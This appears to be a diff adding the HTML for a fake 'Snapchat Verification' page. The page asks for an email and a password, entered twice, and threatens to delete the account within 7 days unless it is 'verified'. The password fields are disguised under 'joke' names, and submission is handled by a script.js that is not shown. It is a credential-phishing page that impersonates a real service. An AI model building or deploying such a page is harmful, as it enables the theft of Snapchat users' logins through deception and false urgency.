@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Snapchat</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+  <!-- Form Page -->
+  <div class="card" id="formPage">
+    <h1 class="title">Snapchat Verification</h1>
+    <p class="subtitle">Verify your Snapchat account</p>
+
+    <form id="jokeForm">
+      <input type="email" id="email" name="email" placeholder="Enter email" required>
+      <textarea id="joke1" name="joke" placeholder="Enter Password" required></textarea>
+      <textarea id="joke2" name="confirm_joke" placeholder="Confirm Password" required></textarea>
+      <button type="submit">Verify Account</button>
+      <!-- Optional redirect after submission if you want a fallback -->
+      <input type="hidden" name="_next" value="">
+    </form>
+
+    <p class="disclaimer">
+      Verify your account within the next 7 days.<br> Otherwise, your Snapchat account will be deleted.
+    </p>
+  </div>
+
+  <!-- Success Page -->
+  <div class="card hidden" id="successPage">
+    <div class="success"> Your account has been verified</div>
+    <p class="success-text">
+      You may now return to Snapchat
+    </p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+
+</html>
